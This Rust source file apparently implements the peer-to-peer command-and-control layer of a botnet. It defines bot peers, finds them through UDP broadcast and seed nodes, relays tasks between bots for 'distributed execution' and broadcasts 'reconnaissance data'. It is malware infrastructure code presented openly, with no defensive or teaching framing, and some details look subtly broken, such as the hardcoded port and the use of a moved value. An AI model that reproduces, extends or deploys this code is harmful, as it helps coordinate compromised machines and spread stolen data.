use std::net::{TcpListener, TcpStream, SocketAddr};
use std::io::{Read, Write};
use std::thread;
use std::time::Duration;
use std::sync::{Arc, Mutex};
use std::collections::HashMap;
use serde::{Deserialize, Serialize};
use rand::Rng;

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct P2PMessage {
    pub message_type: String,
    pub bot_id: String,
    pub data: String,
    pub timestamp: u64,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct BotPeer {
    pub id: String,
    pub address: SocketAddr,
    pub last_seen: u64,
}

pub struct P2PNetwork {
    bot_id: String,
    peers: Arc<Mutex<HashMap<String, BotPeer>>>,
    listen_port: u16,
}

impl P2PNetwork {
    pub fn new(bot_id: String, listen_port: u16) -> Self {
        Self {
            bot_id,
            peers: Arc::new(Mutex::new(HashMap::new())),
            listen_port,
        }
    }

    pub fn start(&self) -> Result<(), Box<dyn std::error::Error>> {
        let peers_clone = Arc::clone(&self.peers);
        let bot_id_clone = self.bot_id.clone();

        // Start listener thread
        thread::spawn(move || {
            Self::listen_for_peers(bot_id_clone, peers_clone, 8081);
        });

        // Start peer discovery
        self.start_peer_discovery();

        Ok(())
    }

    fn listen_for_peers(bot_id: String, peers: Arc<Mutex<HashMap<String, BotPeer>>>, port: u16) {
        let listener = match TcpListener::bind(format!("0.0.0.0:{}", port)) {
            Ok(l) => l,
            Err(e) => {
                eprintln!("Failed to bind P2P listener: {}", e);
                return;
            }
        };

        println!("P2P network listening on port {}", port);

        for stream in listener.incoming() {
            match stream {
                Ok(stream) => {
                    let peers_clone = Arc::clone(&peers);
                    let bot_id_clone = bot_id.clone();
                    thread::spawn(move || {
                        Self::handle_peer_connection(stream, bot_id_clone, peers_clone);
                    });
                }
                Err(e) => eprintln!("P2P connection failed: {}", e),
            }
        }
    }

    fn handle_peer_connection(mut stream: TcpStream, bot_id: String, peers: Arc<Mutex<HashMap<String, BotPeer>>>) {
        let mut buffer = [0u8; 1024];

        // Send hello message
        let hello = P2PMessage {
            message_type: "hello".to_string(),
            bot_id: bot_id.clone(),
            data: "".to_string(),
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        };

        if let Ok(json) = serde_json::to_string(&hello) {
            let _ = stream.write_all(json.as_bytes());
        }

        // Read peer response
        match stream.read(&mut buffer) {
            Ok(size) if size > 0 => {
                if let Ok(msg_str) = std::str::from_utf8(&buffer[..size]) {
                    if let Ok(msg) = serde_json::from_str::<P2PMessage>(msg_str) {
                        if msg.message_type == "hello" {
                            let peer = BotPeer {
                                id: msg.bot_id.clone(),
                                address: stream.peer_addr().unwrap(),
                                last_seen: msg.timestamp,
                            };

                            let mut peers_lock = peers.lock().unwrap();
                            peers_lock.insert(msg.bot_id, peer);
                            println!("Connected to peer: {}", msg.bot_id);
                        }
                    }
                }
            }
            _ => {}
        }
    }

    fn start_peer_discovery(&self) {
        let peers_clone = Arc::clone(&self.peers);
        let bot_id_clone = self.bot_id.clone();

        thread::spawn(move || {
            loop {
                // Discover peers through various methods
                Self::discover_peers_via_broadcast(&bot_id_clone, &peers_clone);
                Self::discover_peers_via_known_seeds(&bot_id_clone, &peers_clone);

                thread::sleep(Duration::from_secs(30));
            }
        });
    }

    fn discover_peers_via_broadcast(bot_id: &str, peers: &Arc<Mutex<HashMap<String, BotPeer>>>) {
        // UDP broadcast for local network discovery
        // This is a simplified implementation
        let broadcast_addr = "255.255.255.255:8082";

        if let Ok(socket) = std::net::UdpSocket::bind("0.0.0.0:0") {
            let _ = socket.set_broadcast(true);
            let discovery_msg = format!("DISCOVER:{}", bot_id);

            let _ = socket.send_to(discovery_msg.as_bytes(), broadcast_addr);
        }
    }

    fn discover_peers_via_known_seeds(bot_id: &str, peers: &Arc<Mutex<HashMap<String, BotPeer>>>) {
        // Connect to known seed nodes
        let seeds = vec![
            "127.0.0.1:8081", // Localhost for testing
            // Add more seed nodes here
        ];

        for seed in seeds {
            if let Ok(stream) = TcpStream::connect(seed) {
                let mut peers_clone = Arc::clone(peers);
                let bot_id_clone = bot_id.to_string();
                thread::spawn(move || {
                    Self::handle_peer_connection(stream, bot_id_clone, peers_clone);
                });
            }
        }
    }

    pub fn broadcast_message(&self, message: P2PMessage) {
        let peers = self.peers.lock().unwrap();
        let json = serde_json::to_string(&message).unwrap();

        for peer in peers.values() {
            if let Ok(mut stream) = TcpStream::connect(peer.address) {
                let _ = stream.write_all(json.as_bytes());
            }
        }
    }

    pub fn get_peers(&self) -> Vec<BotPeer> {
        let peers = self.peers.lock().unwrap();
        peers.values().cloned().collect()
    }

    pub fn relay_task(&self, task_data: &str) {
        // Relay task to other peers for distributed execution
        let message = P2PMessage {
            message_type: "task_relay".to_string(),
            bot_id: self.bot_id.clone(),
            data: task_data.to_string(),
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        };

        self.broadcast_message(message);
    }

    pub fn share_bot_info(&self, info: &str) {
        // Share reconnaissance data with peers
        let message = P2PMessage {
            message_type: "recon_data".to_string(),
            bot_id: self.bot_id.clone(),
            data: info.to_string(),
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        };

        self.broadcast_message(message);
    }
}
